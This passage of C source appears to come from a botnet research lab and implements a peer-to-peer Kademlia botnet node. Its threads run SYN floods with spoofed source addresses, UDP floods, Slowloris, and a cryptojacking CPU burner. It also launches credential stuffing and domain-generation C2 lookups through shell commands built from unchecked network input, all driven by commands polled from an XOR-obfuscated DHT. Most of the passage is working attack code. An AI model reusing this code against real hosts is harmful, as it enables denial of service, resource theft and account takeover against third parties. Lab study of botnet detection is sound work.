    int            plen    = len - HDR_SIZE;

    if (type == MSG_PING) {
        uint8_t resp[HDR_SIZE];
        encode_header(resp, MSG_PONG, msg_id, n->self_id,
                      n->self_ip, n->self_port);
        send_msg(n->sock, resp, HDR_SIZE, sender_ip, sender_port);

    } else if (type == MSG_FIND_NODE && plen >= ID_BYTES) {
        NodeID target; memcpy(target, payload, ID_BYTES);
        int n_found = 0;
        Contact *found = routing_find_closest(&n->routing, target, K, &n_found);
        int resp_size = HDR_SIZE + 1 + n_found * CONTACT_SIZE;
        uint8_t *resp = malloc(resp_size);
        if (!resp) { free(found); return; }
        encode_header(resp, MSG_FOUND_NODES, msg_id, n->self_id,
                      n->self_ip, n->self_port);
        resp[HDR_SIZE] = (uint8_t)n_found;
        for (int i = 0; i < n_found; i++) {
            uint8_t *e = resp + HDR_SIZE + 1 + i * CONTACT_SIZE;
            memcpy(e,              found[i].id,   ID_BYTES);
            memcpy(e + ID_BYTES,   &found[i].ip,  4);
            memcpy(e + ID_BYTES+4, &found[i].port, 2);
        }
        send_msg(n->sock, resp, resp_size, sender_ip, sender_port);
        free(resp); free(found);

    } else if (type == MSG_STORE && plen >= ID_BYTES + 2) {
        uint8_t key[ID_BYTES]; memcpy(key, payload, ID_BYTES);
        uint16_t vlen_net; memcpy(&vlen_net, payload + ID_BYTES, 2);
        int vlen = (int)ntohs(vlen_net);
        if (plen >= ID_BYTES + 2 + vlen)
            kvstore_put(&n->store, key,
                        (const char *)(payload + ID_BYTES + 2), vlen);
        uint8_t resp[HDR_SIZE];
        encode_header(resp, MSG_PONG, msg_id, n->self_id,
                      n->self_ip, n->self_port);
        send_msg(n->sock, resp, HDR_SIZE, sender_ip, sender_port);

    } else if (type == MSG_FIND_VALUE && plen >= ID_BYTES) {
        uint8_t key[ID_BYTES]; memcpy(key, payload, ID_BYTES);
        char value[MAX_VALUE_LEN];
        int vlen = kvstore_get(&n->store, key, value, MAX_VALUE_LEN);
        if (vlen > 0) {
            uint16_t vlen_net = htons((uint16_t)vlen);
            int resp_size = HDR_SIZE + ID_BYTES + 2 + vlen;
            uint8_t *resp = malloc(resp_size);
            if (!resp) return;
            int off = encode_header(resp, MSG_FOUND_VALUE, msg_id, n->self_id,
                                    n->self_ip, n->self_port);
            memcpy(resp + off, key,       ID_BYTES); off += ID_BYTES;
            memcpy(resp + off, &vlen_net, 2);        off += 2;
            memcpy(resp + off, value,     vlen);
            send_msg(n->sock, resp, resp_size, sender_ip, sender_port);
            free(resp);
        } else {
            int n_found = 0;
            Contact *found = routing_find_closest(&n->routing, key, K, &n_found);
            int resp_size = HDR_SIZE + 1 + n_found * CONTACT_SIZE;
            uint8_t *resp = malloc(resp_size);
            if (!resp) { free(found); return; }
            encode_header(resp, MSG_FOUND_NODES, msg_id, n->self_id,
                          n->self_ip, n->self_port);
            resp[HDR_SIZE] = (uint8_t)n_found;
            for (int i = 0; i < n_found; i++) {
                uint8_t *e = resp + HDR_SIZE + 1 + i * CONTACT_SIZE;
                memcpy(e,              found[i].id,    ID_BYTES);
                memcpy(e + ID_BYTES,   &found[i].ip,   4);
                memcpy(e + ID_BYTES+4, &found[i].port,  2);
            }
            send_msg(n->sock, resp, resp_size, sender_ip, sender_port);
            free(resp); free(found);
        }

    } else if (type == MSG_STOP_ALL) {
        /* Handled in attack management section — signal all active attacks */
        printf("[P2P] STOP_ALL received\n");
        if (n) {
            pthread_mutex_lock(&n->attack_lock);
            for (int i = 0; i < MAX_ATTACKS; i++)
                if (n->attacks[i].active && n->attacks[i].args)
                    n->attacks[i].args->stop = 1;
            pthread_mutex_unlock(&n->attack_lock);
        }

    } else if (type == MSG_SHUTDOWN) {
        printf("[P2P] SHUTDOWN command received — stopping node\n");
        if (n) {
            pthread_mutex_lock(&n->attack_lock);
            for (int i = 0; i < MAX_ATTACKS; i++)
                if (n->attacks[i].active && n->attacks[i].args)
                    n->attacks[i].args->stop = 1;
            pthread_mutex_unlock(&n->attack_lock);
            n->running = 0;
        }
    }
}

/* ── Receive loop thread ─────────────────────────────────────── */
static void *recv_loop(void *arg) {
    KademliaNode *n = arg;
    uint8_t enc_buf[UDP_BUF], dec_buf[UDP_BUF];
    struct sockaddr_in src;
    socklen_t src_len = sizeof(src);

    while (n->running) {
        int r = (int)recvfrom(n->sock, enc_buf, UDP_BUF, 0,
                               (struct sockaddr *)&src, &src_len);
        if (r <= 0) continue;
        if (r > (int)UDP_BUF) continue;
        xor_cipher(enc_buf, dec_buf, r);
        if (r < HDR_SIZE) continue;

        /* Check pending RPCs first */
        uint8_t msg_id[8]; memcpy(msg_id, dec_buf + 1, 8);
        int matched = 0;
        pthread_mutex_lock(&n->pending_lock);
        for (PendingRPC *p = n->pending_head; p; p = p->next) {
            if (memcmp(p->msg_id, msg_id, 8) == 0) {
                pthread_mutex_lock(&p->lock);
                memcpy(p->response_buf, dec_buf, r);
                p->response_len = r;
                p->done = 1;
                pthread_cond_signal(&p->cond);
                pthread_mutex_unlock(&p->lock);
                matched = 1; break;
            }
        }
        pthread_mutex_unlock(&n->pending_lock);
        if (!matched) handle_incoming(n, dec_buf, r);
    }
    return NULL;
}

/* ══════════════════════════════════════════════════════════════
 *  In-process attack implementations
 *  All run in detached threads, check args->stop periodically.
 * ══════════════════════════════════════════════════════════════ */

/* TCP/IP checksum pseudo-header for checksum calculation */
struct pseudo_hdr {
    uint32_t src, dst;
    uint8_t  zero, proto;
    uint16_t tcp_len;
};

static uint16_t tcp_cksum(struct iphdr *iph, struct tcphdr *tcph) {
    struct pseudo_hdr ph;
    ph.src     = iph->saddr;
    ph.dst     = iph->daddr;
    ph.zero    = 0;
    ph.proto   = IPPROTO_TCP;
    ph.tcp_len = htons(sizeof(struct tcphdr));
    uint8_t buf[sizeof(ph) + sizeof(struct tcphdr)];
    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), tcph, sizeof(struct tcphdr));
    return inet_cksum(buf, sizeof(buf));
}

/* ── SYN Flood ───────────────────────────────────────────────── */
static void *syn_flood_thread(void *arg) {
    AttackArgs *a = arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[ATTACK] SYN flood: raw socket (needs root)");
        return NULL;
    }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = inet_addr(a->target);
    dst.sin_port        = htons(a->port);

    uint8_t pkt[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr  *iph  = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));

    time_t end = time(NULL) + a->duration;
    long count = 0;
    printf("[ATTACK] SYN FLOOD -> %s:%d  duration=%ds\n",
           a->target, a->port, a->duration);

    while (time(NULL) < end && !a->stop) {
        uint32_t src_ip = htonl(
            (uint32_t)(10 + (rand() % 220)) << 24 |
            (uint32_t)(rand() % 256)         << 16 |
            (uint32_t)(rand() % 256)         <<  8 |
            (uint32_t)(1 + rand() % 254));

        memset(pkt, 0, sizeof(pkt));
        iph->ihl      = 5;
        iph->version  = 4;
        iph->tot_len  = htons(sizeof(pkt));
        iph->id       = htons((uint16_t)rand());
        iph->ttl      = 64 + rand() % 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr    = src_ip;
        iph->daddr    = dst.sin_addr.s_addr;
        iph->check    = inet_cksum(iph, sizeof(struct iphdr));

        tcph->source  = htons(1024 + rand() % 64511);
        tcph->dest    = htons(a->port);
        tcph->seq     = htonl((uint32_t)rand());
        tcph->doff    = 5;
        tcph->syn     = 1;
        tcph->window  = htons(65535);
        tcph->check   = tcp_cksum(iph, tcph);

        sendto(sock, pkt, sizeof(pkt), 0,
               (struct sockaddr *)&dst, sizeof(dst));
        count++;
    }
    close(sock);
    printf("[ATTACK] SYN FLOOD done. Packets: %ld\n", count);
    return NULL;
}

/* ── UDP Flood ───────────────────────────────────────────────── */
static void *udp_flood_thread(void *arg) {
    AttackArgs *a = arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { perror("[ATTACK] UDP flood"); return NULL; }

    uint8_t payload[1024];
    memset(payload, 0, sizeof(payload));

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = inet_addr(a->target);

    time_t end = time(NULL) + a->duration;
    long count = 0;
    printf("[ATTACK] UDP FLOOD -> %s  duration=%ds\n",
           a->target, a->duration);

    while (time(NULL) < end && !a->stop) {
        dst.sin_port = htons(1 + rand() % 65534);
        sendto(sock, payload, sizeof(payload), 0,
               (struct sockaddr *)&dst, sizeof(dst));
        count++;
    }
    close(sock);
    printf("[ATTACK] UDP FLOOD done. Packets: %ld\n", count);
    return NULL;
}

/* ── Slowloris ───────────────────────────────────────────────── */
static void *slowloris_thread(void *arg) {
    AttackArgs *a = arg;
    printf("[ATTACK] SLOWLORIS -> %s:%d  duration=%ds  sockets=%d\n",
           a->target, a->port, a->duration, SLOWLORIS_SOCKS);

    int fds[SLOWLORIS_SOCKS];
    int n_open = 0;

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family      = AF_INET;
    dst.sin_addr.s_addr = inet_addr(a->target);
    dst.sin_port        = htons(a->port);

    /* Open SLOWLORIS_SOCKS connections with partial HTTP GET */
    for (int i = 0; i < SLOWLORIS_SOCKS && !a->stop; i++) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct timeval tv = {4, 0};
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            close(s); continue;
        }
        char req[128];
        snprintf(req, sizeof(req),
                 "GET /?%d HTTP/1.1\r\nHost: %s\r\n",
                 rand() % 9999, a->target);
        send(s, req, strlen(req), 0);
        fds[n_open++] = s;
    }

    time_t end = time(NULL) + a->duration;
    while (time(NULL) < end && !a->stop) {
        /* Drip one header per socket every 10 seconds */
        for (int i = 0; i < n_open; i++) {
            char hdr[64];
            snprintf(hdr, sizeof(hdr), "X-a: %d\r\n", rand() % 5000);
            if (send(fds[i], hdr, strlen(hdr), 0) < 0) {
                close(fds[i]);
                fds[i] = fds[--n_open]; i--;
            }
        }
        /* Refill dropped connections */
        for (int fill = n_open; fill < SLOWLORIS_SOCKS && !a->stop; fill++) {
            int s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) break;
            struct timeval tv = {4, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
                close(s); continue;
            }
            char req[128];
            snprintf(req, sizeof(req),
                     "GET /?%d HTTP/1.1\r\nHost: %s\r\n",
                     rand() % 9999, a->target);
            send(s, req, strlen(req), 0);
            fds[n_open++] = s;
        }
        sleep(10);
    }
    for (int i = 0; i < n_open; i++) close(fds[i]);
    printf("[ATTACK] SLOWLORIS done. Peak sockets: %d\n", n_open);
    return NULL;
}

/* ── Cryptojack (CPU burn loop with throttle) ────────────────── */
static void *cryptojack_thread(void *arg) {
    AttackArgs *a = arg;
    printf("[ATTACK] CRYPTOJACK  cpu=%.0f%%  duration=%ds\n",
           a->cpu * 100.0, a->duration);
    time_t end = time(NULL) + a->duration;
    uint8_t state[SHA256_DIGEST_LENGTH];
    SHA256((const uint8_t *)"init", 4, state);

    while (time(NULL) < end && !a->stop) {
        /* Work for cpu_fraction × 100ms */
        struct timespec work_end;
        clock_gettime(CLOCK_MONOTONIC, &work_end);
        work_end.tv_nsec += (long)(a->cpu * 100000000L);
        if (work_end.tv_nsec >= 1000000000L) {
            work_end.tv_sec++;
            work_end.tv_nsec -= 1000000000L;
        }
        struct timespec now;
        do {
            SHA256(state, SHA256_DIGEST_LENGTH, state);
            clock_gettime(CLOCK_MONOTONIC, &now);
        } while (now.tv_sec < work_end.tv_sec ||
                 (now.tv_sec == work_end.tv_sec &&
                  now.tv_nsec < work_end.tv_nsec));

        /* Sleep for (1 - cpu_fraction) × 100ms */
        struct timespec sleep_ts = {
            0, (long)((1.0 - a->cpu) * 100000000L)
        };
        nanosleep(&sleep_ts, NULL);
    }
    printf("[ATTACK] CRYPTOJACK done.\n");
    return NULL;
}

/* ── Attack management ───────────────────────────────────────── */

static void launch_attack(KademliaNode *n, const char *type,
                           void *(*fn)(void *), AttackArgs *args) {
    pthread_mutex_lock(&n->attack_lock);
    /* Stop any prior attack of the same type */
    for (int i = 0; i < MAX_ATTACKS; i++) {
        if (n->attacks[i].active &&
            strcmp(n->attacks[i].type, type) == 0) {
            n->attacks[i].args->stop = 1;
            pthread_detach(n->attacks[i].tid);
            n->attacks[i].active = 0;
            break;
        }
    }
    /* Find an empty slot */
    for (int i = 0; i < MAX_ATTACKS; i++) {
        if (!n->attacks[i].active) {
            strncpy(n->attacks[i].type, type, 31);
            n->attacks[i].args   = args;
            n->attacks[i].active = 1;
            pthread_create(&n->attacks[i].tid, NULL, fn, args);
            printf("[ATTACK] Launched: %s\n", type);
            pthread_mutex_unlock(&n->attack_lock);
            return;
        }
    }
    pthread_mutex_unlock(&n->attack_lock);
    printf("[ATTACK] Slot limit reached — cannot launch %s\n", type);
}

static void stop_all_attacks(KademliaNode *n) {
    pthread_mutex_lock(&n->attack_lock);
    for (int i = 0; i < MAX_ATTACKS; i++) {
        if (n->attacks[i].active) {
            n->attacks[i].args->stop = 1;
            pthread_detach(n->attacks[i].tid);
            n->attacks[i].active = 0;
        }
    }
    pthread_mutex_unlock(&n->attack_lock);
    printf("[ATTACK] All attacks stopped.\n");
}

/* ── Command execution ───────────────────────────────────────── */

/* Simple JSON field extraction (no library needed for our fixed schema) */
static int json_str(const char *json, const char *field,
                    char *out, int out_len) {
    char search[64]; snprintf(search, sizeof(search), "\"%s\"", field);
    const char *p = strstr(json, search);
    if (!p) return 0;
    p = strchr(p + strlen(search), '"'); if (!p) return 0; p++;
    int len = 0;
    while (*p && *p != '"' && len < out_len - 1) out[len++] = *p++;
    out[len] = '\0';
    return len;
}

static int json_int(const char *json, const char *field, int def) {
    char search[64]; snprintf(search, sizeof(search), "\"%s\"", field);
    const char *p = strstr(json, search);
    if (!p) return def;
    p = strchr(p + strlen(search), ':');
    if (!p) return def;
    while (*p == ':' || *p == ' ') p++;
    if (*p == '"') p++;
    return atoi(p);
}

static double json_float(const char *json, const char *field, double def) {
    char search[64]; snprintf(search, sizeof(search), "\"%s\"", field);
    const char *p = strstr(json, search);
    if (!p) return def;
    p = strchr(p + strlen(search), ':');
    if (!p) return def;
    while (*p == ':' || *p == ' ') p++;
    return atof(p);
}

static void execute_command(KademliaNode *n, const char *cmd_json) {
    char type[32] = {0};
    json_str(cmd_json, "type", type, sizeof(type));

    printf("\n[P2P] *** COMMAND RECEIVED from DHT ***\n");
    printf("[P2P] Type: %s\n", type);
    printf("[P2P] Payload: %.200s\n", cmd_json);

    if (strcmp(type, "syn_flood") == 0) {
        AttackArgs *a = calloc(1, sizeof(AttackArgs));
        if (!a) return;
        json_str(cmd_json, "target", a->target, sizeof(a->target));
        if (!a->target[0]) strcpy(a->target, "192.168.100.20");
        a->port     = json_int(cmd_json, "port",     80);
        a->duration = json_int(cmd_json, "duration", 30);
        launch_attack(n, "syn_flood", syn_flood_thread, a);

    } else if (strcmp(type, "udp_flood") == 0) {
        AttackArgs *a = calloc(1, sizeof(AttackArgs));
        if (!a) return;
        json_str(cmd_json, "target", a->target, sizeof(a->target));
        if (!a->target[0]) strcpy(a->target, "192.168.100.20");
        a->duration = json_int(cmd_json, "duration", 30);
        launch_attack(n, "udp_flood", udp_flood_thread, a);

    } else if (strcmp(type, "slowloris") == 0) {
        AttackArgs *a = calloc(1, sizeof(AttackArgs));
        if (!a) return;
        json_str(cmd_json, "target", a->target, sizeof(a->target));
        if (!a->target[0]) strcpy(a->target, "192.168.100.20");
        a->port     = json_int(cmd_json, "port",     80);
        a->duration = json_int(cmd_json, "duration", 60);
        launch_attack(n, "slowloris", slowloris_thread, a);

    } else if (strcmp(type, "cryptojack") == 0) {
        AttackArgs *a = calloc(1, sizeof(AttackArgs));
        if (!a) return;
        a->duration = json_int(cmd_json,   "duration", 120);
        a->cpu      = json_float(cmd_json, "cpu",      0.25);
        if (a->cpu <= 0.0 || a->cpu > 1.0) a->cpu = 0.25;
        launch_attack(n, "cryptojack", cryptojack_thread, a);

    } else if (strcmp(type, "cred_stuffing") == 0) {
        /*
         * Credential stuffing — delegates to cred_stuffing.py (same as bot_agent.c).
         * The Python module handles all three modes (bot / jitter / distributed)
         * and the CV timing analysis; the C node just spawns the subprocess.
         *
         * JSON fields:
         *   "target"   : victim IP  (default 192.168.100.20)
         *   "port"     : HTTP port  (default 80)
         *   "duration" : seconds    (default 120)
         *   "mode"     : "bot" | "jitter" | "distributed"  (default "jitter")
         *   "jitter"   : jitter ms  (default 200, only used in jitter mode)
         *   "workers"  : thread cnt (default 3,  only used in distributed mode)
         */
        char target[64] = "192.168.100.20";
        char mode[32]   = "jitter";
        int  port       = 80;
        int  duration   = 120;
        int  jitter_ms  = 200;
        int  workers    = 3;

        json_str(cmd_json, "target", target, sizeof(target));
        json_str(cmd_json, "mode",   mode,   sizeof(mode));
        port      = json_int(cmd_json, "port",     port);
        duration  = json_int(cmd_json, "duration", duration);
        jitter_ms = json_int(cmd_json, "jitter",   jitter_ms);
        workers   = json_int(cmd_json, "workers",  workers);

        char cmd[512];
        if (strcmp(mode, "distributed") == 0) {
            snprintf(cmd, sizeof(cmd),
                     "python3 cred_stuffing.py"
                     " --mode distributed"
                     " --host %s --port %d"
                     " --workers %d &",
                     target, port, workers);
        } else {
            snprintf(cmd, sizeof(cmd),
                     "python3 cred_stuffing.py"
                     " --mode %s"
                     " --host %s --port %d"
                     " --interval 500 --jitter %d &",
                     mode, target, port, jitter_ms);
        }
        printf("[P2P] Spawning cred_stuffing: %s\n", cmd);
        system(cmd);

    } else if (strcmp(type, "stop_all") == 0) {
        stop_all_attacks(n);

    } else if (strcmp(type, "shutdown") == 0) {
        stop_all_attacks(n);
        n->running = 0;

    } else if (strcmp(type, "idle") == 0) {
        printf("[P2P] -> Idle\n");
 
    } else if (strcmp(type, "dga_search") == 0) {
        /*
         * Trigger a DGA-based C2 domain search (fallback channel demo).
         *
         * Spawns dga.py as a background subprocess — the burst of
         * NXDOMAIN responses it generates is exactly what IDS Engine 3
         * (Shannon entropy + NXDOMAIN burst counter) is designed to catch.
         *
         * Teaching point: even though the P2P mesh makes C2 takedowns
         * hard, the DGA fallback reveals bot presence to a competent IDS
         * via DNS traffic analysis.
         *
         * The command carries no extra fields — type is sufficient.
         */
        printf("[P2P] -> Triggering DGA C2 search (spawning dga.py)\n");
        system("python3 dga.py &");
 
    } else {
        printf("[P2P] -> Unknown command type: %s\n", type);
    }
}

/* ── Command dedup ───────────────────────────────────────────── */
static int dedup_seen(KademliaNode *n, const char *value) {
    uint8_t hash[ID_BYTES];
    SHA1((const uint8_t *)value, strlen(value), hash);
    pthread_mutex_lock(&n->exec_lock);
    int count = (n->exec_count < EXEC_HISTORY) ? n->exec_count : EXEC_HISTORY;
    for (int i = 0; i < count; i++) {
        int slot = (n->exec_count - 1 - i) % EXEC_HISTORY;
        if (memcmp(n->exec_hashes[slot], hash, ID_BYTES) == 0) {
            pthread_mutex_unlock(&n->exec_lock);
            return 1;
        }
    }
    /* Record it — ring buffer */
    memcpy(n->exec_hashes[n->exec_count % EXEC_HISTORY], hash, ID_BYTES);
    n->exec_count++;
    pthread_mutex_unlock(&n->exec_lock);
    return 0;
}

/* ── Background threads ──────────────────────────────────────── */

static void *command_poll_thread(void *arg) {
    KademliaNode *n = arg;
    uint8_t cmd_key[ID_BYTES]; sha1_str(COMMAND_KEY, cmd_key);
    printf("[P2P] Command poll thread started (interval: %ds)\n", POLL_SEC);
    while (n->running) {
        for (int i = 0; i < POLL_SEC && n->running; i++) sleep(1);
        if (!n->running) break;
        char value[MAX_VALUE_LEN];
        if (iterative_find_value(n, cmd_key, value, MAX_VALUE_LEN)) {
            if (!dedup_seen(n, value))
                execute_command(n, value);
        } else {
            printf("[P2P] DHT poll: no command\n");
        }
    }
    return NULL;
}

static void *bucket_refresh_thread(void *arg) {
    KademliaNode *n = arg;
    printf("[P2P] Refresh thread started (interval: %ds)\n", REFRESH_SEC);
    while (n->running) {
        for (int i = 0; i < REFRESH_SEC && n->running; i++) sleep(1);
        if (!n->running) break;
        printf("[P2P] Refreshing routing table...\n");
        int total = 0;
        for (int i = 0; i < BUCKET_COUNT; i++) {
            if (n->routing.buckets[i].count == 0) continue;
            /* Flip bit i to get a random ID in this bucket's range */
            NodeID rand_target;
            memcpy(rand_target, n->self_id, ID_BYTES);
            rand_target[ID_BYTES - 1 - i/8] ^= (uint8_t)(1 << (i % 8));
            Contact tmp[K]; int got;
            got = iterative_find_node(n, rand_target, tmp, K);
            for (int j = 0; j < got; j++)
                routing_add(&n->routing, &tmp[j], n);
            total += n->routing.buckets[i].count;
        }
        printf("[P2P] Refresh done. Total peers: %d\n", total);
    }
    return NULL;
}

static void *replicate_thread(void *arg) {
    KademliaNode *n = arg;
    printf("[P2P] Replication thread started (interval: %ds)\n", REPLICATE_SEC);
    while (n->running) {
        for (int i = 0; i < REPLICATE_SEC && n->running; i++) sleep(1);
        if (!n->running) break;
        printf("[P2P] Replicating locally stored values...\n");
        pthread_mutex_lock(&n->store.lock);
        /* Snapshot used entries */
        KVEntry snapshot[MAX_KV_ENTRIES];
        int snap_count = 0;
        for (int i = 0; i < MAX_KV_ENTRIES; i++)
            if (n->store.entries[i].used)
                snapshot[snap_count++] = n->store.entries[i];
        pthread_mutex_unlock(&n->store.lock);
        for (int i = 0; i < snap_count; i++) {
            Contact recipients[K]; int n_recip = 0;
            n_recip = iterative_find_node(n, snapshot[i].key, recipients, K);
            int acks = 0;
            for (int j = 0; j < n_recip; j++)
                if (kademlia_store_rpc(n, recipients[j].ip, recipients[j].port,
                                       snapshot[i].key,
                                       snapshot[i].value,
                                       snapshot[i].value_len)) acks++;
            printf("[P2P] Replicated key on %d nodes\n", acks);
        }
    }
    return NULL;
}

static void *status_thread(void *arg) {
    KademliaNode *n = arg;
    while (n->running) {
        for (int i = 0; i < STATUS_SEC && n->running; i++) sleep(1);
        if (!n->running) break;
        int total = 0, kv_count = 0, active_attacks = 0;
        for (int i = 0; i < BUCKET_COUNT; i++)
            total += n->routing.buckets[i].count;
        pthread_mutex_lock(&n->store.lock);
        for (int i = 0; i < MAX_KV_ENTRIES; i++)
            if (n->store.entries[i].used) kv_count++;
        pthread_mutex_unlock(&n->store.lock);
        pthread_mutex_lock(&n->attack_lock);
        for (int i = 0; i < MAX_ATTACKS; i++)
            if (n->attacks[i].active) active_attacks++;
        pthread_mutex_unlock(&n->attack_lock);

        char id_hex[ID_BYTES*2+1];
        for (int i = 0; i < ID_BYTES; i++)
            sprintf(id_hex + i*2, "%02x", n->self_id[i]);
        printf("\n[P2P] ── Status ──────────────────────────────\n");
        printf("[P2P]  Node ID  : %.16s...\n", id_hex);
        printf("[P2P]  Peers    : %d\n", total);
        printf("[P2P]  KV keys  : %d\n", kv_count);
        printf("[P2P]  Attacks  : %d active\n", active_attacks);
        printf("[P2P]  Commands : %d executed\n", n->exec_count);
        printf("[P2P] ─────────────────────────────────────────\n\n");
    }
    return NULL;
}

/* ── Bootstrap ───────────────────────────────────────────────── */
static void bootstrap_from(KademliaNode *n,
                            const char *seed_host, uint16_t seed_port_nbo) {
    printf("[P2P] Bootstrapping from %s:%u\n",
           seed_host, (unsigned)ntohs(seed_port_nbo));
    struct in_addr addr;
    if (resolve_host(seed_host, &addr) < 0) {
        printf("[P2P] Cannot resolve seed: %s\n", seed_host);
        return;
    }
    Contact seed;
    id_from_host_port(seed_host, seed_port_nbo, seed.id);
    seed.ip        = addr.s_addr;
    seed.port      = seed_port_nbo;
    seed.last_seen = time(NULL);
    seed.fail_count = 0;

    if (kademlia_ping(n, seed.ip, seed.port)) {
        routing_add(&n->routing, &seed, n);
        printf("[P2P] Seed reachable ✓\n");
    } else {
        printf("[P2P] Seed unreachable — skipping\n");
        return;
    }
    Contact found[K]; int n_found;
    n_found = iterative_find_node(n, n->self_id, found, K);
    for (int i = 0; i < n_found; i++)
        routing_add(&n->routing, &found[i], n);
    printf("[P2P] Bootstrap from %s: %d peers discovered\n",
           seed_host, n_found);
}

/* ── Node init / start / stop ────────────────────────────────── */
static int node_init(KademliaNode *n, const char *host, uint16_t port_nbo) {
    memset(n, 0, sizeof(*n));
    struct in_addr addr;
    if (resolve_host(host, &addr) < 0) {
        perror("resolve_host"); return -1;
    }
    n->self_ip   = addr.s_addr;
    n->self_port = port_nbo;
    id_from_host_port(host, port_nbo, n->self_id);

    printf("[P2P] Node ID: ");
    for (int i = 0; i < ID_BYTES; i++) printf("%02x", n->self_id[i]);
    printf("\n[P2P] Listening on %s:%u\n",
           host, (unsigned)ntohs(port_nbo));

    routing_init(&n->routing, n->self_id);
    kvstore_init(&n->store);
    pthread_mutex_init(&n->pending_lock, NULL);
    pthread_mutex_init(&n->exec_lock,    NULL);
    pthread_mutex_init(&n->attack_lock,  NULL);

    n->sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (n->sock < 0) { perror("socket"); return -1; }
    int one = 1;
    setsockopt(n->sock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct timeval tv = {1, 0};
    setsockopt(n->sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family      = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port        = port_nbo;
    if (bind(n->sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("bind"); return -1;
    }
    n->running = 1;
    return 0;
}

static void node_start_threads(KademliaNode *n) {
    pthread_create(&n->recv_tid,      NULL, recv_loop,            n);
    pthread_create(&n->refresh_tid,   NULL, bucket_refresh_thread, n);
    pthread_create(&n->poll_tid,      NULL, command_poll_thread,   n);
    pthread_create(&n->replicate_tid, NULL, replicate_thread,      n);
    pthread_create(&n->status_tid,    NULL, status_thread,         n);
}

static void node_stop(KademliaNode *n) {
    n->running = 0;
    stop_all_attacks(n);
    close(n->sock);
}

/* ── SIGINT handler ──────────────────────────────────────────── */
static void sigint_handler(int sig) {
    (void)sig;
    printf("\n[P2P] SIGINT — shutting down gracefully...\n");
    if (g_node) node_stop(g_node);
}

/* ── Demo ────────────────────────────────────────────────────── */
static void run_demo(void) {
    printf("==============================================\n");
    printf(" Kademlia P2P Demo — 5-node local mesh\n");
    printf(" AUA Botnet Research Lab\n");
    printf(" (Compatible with p2p_node.py --demo)\n");
    printf("==============================================\n\n");

    const int N_NODES = 5;
    static KademliaNode nodes[5];
    uint16_t ports[5] = {
        htons(7500), htons(7501), htons(7502), htons(7503), htons(7504)
    };

    for (int i = 0; i < N_NODES; i++) {
        if (node_init(&nodes[i], "127.0.0.1", ports[i]) < 0) {
            fprintf(stderr, "[DEMO] node_init failed\n"); return;
        }
        pthread_create(&nodes[i].recv_tid, NULL, recv_loop, &nodes[i]);
    }
    usleep(200000);

    /* Bootstrap nodes 1-4 from node 0 */
    for (int i = 1; i < N_NODES; i++) {
        bootstrap_from(&nodes[i], "127.0.0.1", ports[0]);
        usleep(100000);
    }
    sleep(2);

    /* Botmaster (node 0) injects a command */
    printf("\n[DEMO] Botmaster injecting syn_flood command via node 0...\n");
    uint8_t cmd_key[ID_BYTES]; sha1_str(COMMAND_KEY, cmd_key);
    const char *cmd = "{\"type\":\"syn_flood\","
                      "\"target\":\"192.168.100.20\","
                      "\"port\":80,\"duration\":5}";
    store_value(&nodes[0], cmd_key, cmd, strlen(cmd));
    sleep(1);

    /* All nodes poll for command */
    printf("\n[DEMO] All nodes polling DHT for command...\n");
    int found_count = 0;
    for (int i = 0; i < N_NODES; i++) {
        char found[MAX_VALUE_LEN];
        int ok = iterative_find_value(&nodes[i], cmd_key, found, MAX_VALUE_LEN);
        char id_hex[9] = {0};
        for (int j = 0; j < 4; j++)
            sprintf(id_hex + j*2, "%02x", nodes[i].self_id[j]);
        printf("  Node %s... %s\n", id_hex,
               ok ? "FOUND command ✓" : "not found");
        if (ok) found_count++;
    }
    printf("[DEMO] %d/%d nodes found the command\n\n", found_count, N_NODES);

    /* Resilience test: kill 40% (2 of 5 nodes) */
    printf("[DEMO] ── Resilience test: killing 2/%d nodes (40%%) ──\n",
           N_NODES);
    nodes[1].running = 0;
    nodes[3].running = 0;
    printf("[DEMO] Killed nodes 1 and 3. Waiting for routing to adapt...\n");
    sleep(2);

    /* Remaining survivors look up command */
    printf("[DEMO] Survivors polling DHT...\n");
    int survivor_found = 0;
    int survivors[] = {0, 2, 4};
    for (int s = 0; s < 3; s++) {
        int i = survivors[s];
        char found[MAX_VALUE_LEN];
        int ok = iterative_find_value(&nodes[i], cmd_key, found, MAX_VALUE_LEN);
        char id_hex[9] = {0};
        for (int j = 0; j < 4; j++)
            sprintf(id_hex + j*2, "%02x", nodes[i].self_id[j]);
        printf("  Survivor %s... %s\n", id_hex,
               ok ? "command STILL FOUND ✓" : "not found");
        if (ok) survivor_found++;
    }
    printf("[DEMO] %d/3 survivors found the command after 40%% node loss\n",
           survivor_found);
